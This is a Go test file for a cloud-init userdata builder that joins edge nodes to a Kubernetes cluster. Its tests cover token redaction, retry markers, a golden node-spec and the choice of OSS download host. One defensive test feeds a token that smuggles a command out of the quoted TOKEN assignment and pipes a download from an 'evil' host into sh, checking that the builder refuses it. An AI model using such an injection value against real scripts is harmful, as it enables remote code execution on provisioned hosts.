package main

import (
	"encoding/base64"
	"strings"
	"testing"
)

type fakeTokenFetcher struct{ token string }

func (f *fakeTokenFetcher) FetchAttachToken(g *Group) (string, error) { return f.token, nil }

func buildTestUserdata(t *testing.T) (string, string) {
	t.Helper()
	cfg := loadTestConfig(t)
	g := cfg.GroupByID("np-a")
	const token = "SECRET-ATTACH-TOKEN-12345"
	b64, err := BuildUserdata(&fakeTokenFetcher{token}, cfg, g)
	if err != nil {
		t.Fatalf("BuildUserdata: %v", err)
	}
	raw, err := base64.StdEncoding.DecodeString(b64)
	if err != nil {
		t.Fatalf("decode: %v", err)
	}
	return string(raw), token
}

// N-9 at the unit level: the script must never enable xtrace, and the token
// must appear EXACTLY once (the TOKEN= assignment) and be unset after use.
func TestUserdataTokenRedaction(t *testing.T) {
	script, token := buildTestUserdata(t)
	if strings.Contains(script, "set -x") {
		t.Fatalf("script contains 'set -x' — xtrace leaks the token to cloud-init logs")
	}
	if n := strings.Count(script, token); n != 1 {
		t.Fatalf("token appears %d times, want exactly 1 (the TOKEN= assignment)", n)
	}
	if !strings.Contains(script, "TOKEN='"+token+"'") {
		t.Fatalf("token not delivered via the TOKEN variable")
	}
	if !strings.Contains(script, "unset TOKEN") {
		t.Fatalf("token is not unset after the join")
	}
	if !strings.Contains(script, "s/$TOKEN/REDACTED/g\" /var/log/edgeadm.log") {
		t.Fatalf("missing the edgeadm.log scrub (N-9 residual)")
	}
	// the join command must reference the variable, not the literal
	if !strings.Contains(script, `--openapi-token="$TOKEN"`) {
		t.Fatalf("join must use the TOKEN variable")
	}
}

func TestUserdataRetriesAndMarkers(t *testing.T) {
	script, _ := buildTestUserdata(t)
	for _, want := range []string{
		"ens-provider-join-marker", "edgeadm-download-retry", "join-retry",
		"join-done", "join-FAILED", "edgeadm-download-FAILED",
		"growpart /dev/vda 3", "iptable_nat", "ens_eth0", // fix sequence intact
	} {
		if !strings.Contains(script, want) {
			t.Fatalf("script missing %q", want)
		}
	}
}

// Golden node-spec: byte-stability of the console-parity contract. If this
// test fails you CHANGED the join contract — do that deliberately or not at all.
func TestNodeSpecGolden(t *testing.T) {
	cfg := loadTestConfig(t)
	g := cfg.GroupByID("np-a")
	spec, err := buildNodeSpec(cfg, g)
	if err != nil {
		t.Fatal(err)
	}
	const golden = `{"allowedClusterAddons":["kube-proxy","flannel","coredns"],"imageRepoType":"public","interconnectMode":"private","labels":{"alibabacloud.com/interconnection-mode":"private","apps.openyurt.io/desired-nodepool":"np-a","product":"web"},"manageRuntime":true,"openapiType":"public","poolNodesConnected":true,"quiet":true,"runtime":"containerd","runtimeRootDir":"/var/lib/containerd","runtime_version":"1.6.39","selfHostNtpServer":false,"taints":[{"key":"product","value":"web","effect":"NoSchedule"}]}`
	if spec != golden {
		t.Fatalf("node-spec drifted from golden:\n got: %s\nwant: %s", spec, golden)
	}
}

// v0.1.18 (D1): IMAGE_REPO_TYPE=private must flip BOTH download paths — the
// node-spec imageRepoType (edgeadm's component downloads) AND the edgeadm
// binary host (oss-<region>-internal). Default (golden above) stays public.
func TestUserdataPrivateImageRepo(t *testing.T) {
	t.Setenv("IMAGE_REPO_TYPE", "private")
	cfg := loadTestConfig(t)
	g := cfg.GroupByID("np-a")

	spec, err := buildNodeSpec(cfg, g)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(spec, `"imageRepoType":"private"`) {
		t.Fatalf("node-spec must carry imageRepoType=private, got: %s", spec)
	}

	b64, err := BuildUserdata(&fakeTokenFetcher{"tok"}, cfg, g)
	if err != nil {
		t.Fatal(err)
	}
	raw, _ := base64.StdEncoding.DecodeString(b64)
	script := string(raw)
	if !strings.Contains(script, ".oss-ap-southeast-1-internal.aliyuncs.com/public/pkg/run/attach/") {
		t.Fatalf("edgeadm download must use the internal OSS host in private mode")
	}
	if strings.Contains(script, ".oss-ap-southeast-1.aliyuncs.com/") {
		t.Fatalf("private mode must not reference the public OSS host")
	}
}

// The default path is byte-stable: public host, public node-spec.
func TestUserdataPublicImageRepoDefault(t *testing.T) {
	script, _ := buildTestUserdata(t)
	if !strings.Contains(script, ".oss-ap-southeast-1.aliyuncs.com/public/pkg/run/attach/") {
		t.Fatalf("default mode must use the public OSS host")
	}
	if strings.Contains(script, "-internal.aliyuncs.com") {
		t.Fatalf("default mode must not reference the internal OSS host")
	}
}

// P0-1 companion gate: a token that would break out of the script's
// single-quoted TOKEN='…' (or corrupt the sed scrub) must be refused at build
// time — and the refusal must not leak the token itself.
func TestUserdataRejectsShellBreakingToken(t *testing.T) {
	cfg := loadTestConfig(t)
	g := cfg.GroupByID("np-a")
	for _, tok := range []string{"SECRET'; curl evil | sh #", `SECRET\`} {
		_, err := BuildUserdata(&fakeTokenFetcher{tok}, cfg, g)
		if err == nil {
			t.Fatalf("token %q must be refused", tok)
		}
		if strings.Contains(err.Error(), "SECRET") {
			t.Fatalf("refusal error leaks token content: %v", err)
		}
	}
	// ordinary token shapes still build
	if _, err := BuildUserdata(&fakeTokenFetcher{"abcDEF012.-_~"}, cfg, g); err != nil {
		t.Fatalf("safe token refused: %v", err)
	}
}

// Config validation: anything but public|private is a fail-fast startup error.
func TestImageRepoTypeValidation(t *testing.T) {
	t.Setenv("IMAGE_REPO_TYPE", "internal") // a plausible typo for "private"
	setEnv(t, map[string]string{
		"ENS_REGION": "ens-region-1", "CLUSTER_ID": "c-test",
		"NETWORK_ID": "n-x", "VSWITCH_ID": "vsw-x", "SECURITY_GROUP_ID": "sg-default",
		"NODE_GROUPS": groupsJSON,
	})
	if _, err := LoadConfig(); err == nil {
		t.Fatalf("LoadConfig must reject IMAGE_REPO_TYPE=internal")
	}
}
